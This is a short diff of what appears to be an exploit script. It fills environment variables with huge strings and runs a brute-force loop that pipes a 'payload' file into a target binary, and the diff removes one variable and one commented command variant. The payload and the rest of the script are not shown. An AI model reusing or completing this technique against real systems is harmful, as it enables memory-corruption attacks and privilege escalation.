@@ -25,7 +25,6 @@ env_vars = {
     "VAR12": "L" * 131000,
     "VAR13": "M" * 131000,
     "VAR14": "N" * 131000,
-    "VAR15": "O" * 131000
 }
 
 def check_target_bin(target):
@@ -334,8 +333,6 @@ def main():
     #performing brute force attack
     # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
     exploit_command = f"cat payload - | {target} `cat payload`"
-    # exploit_command = f"cat payload - | {target} AAAAA"
-
 
     i = 0
     while True:
